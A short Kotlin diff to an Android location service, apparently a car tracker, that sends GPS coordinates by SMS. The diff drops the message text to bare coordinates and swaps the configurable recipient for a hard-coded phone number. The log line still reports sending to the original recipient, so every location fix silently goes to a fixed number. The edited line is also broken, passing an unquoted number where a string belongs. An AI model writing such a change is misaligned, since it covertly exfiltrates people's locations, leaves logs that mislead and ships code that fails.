@@ -135,9 +135,8 @@ class LocationService : Service() {
     }
 
     private fun sendLocationSms(phoneNumber: String, location: Location) {
-        // إرسال الإحداثيات كأرقام فقط بدون رابط، لأن بعض الشبكات بتحظر رسائل فيها روابط
-        val message = "موقع السيارة الحالي:\n${location.latitude},${location.longitude}"
-
+       // إرسال الإحداثيات فقط بدون أي نص إضافي وبدون رابط
+        val message = "${location.latitude},${location.longitude}"
         try {
             val smsManager: SmsManager =
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -148,7 +147,7 @@ class LocationService : Service() {
                 }
 
             val parts = smsManager.divideMessage(message)
-            smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null)
+            smsManager.sendMultipartTextMessage(+201099422975, null, parts, null, null)
 
             Log.d(TAG, "تم إرسال الموقع إلى $phoneNumber")
         } catch (e: Exception) {
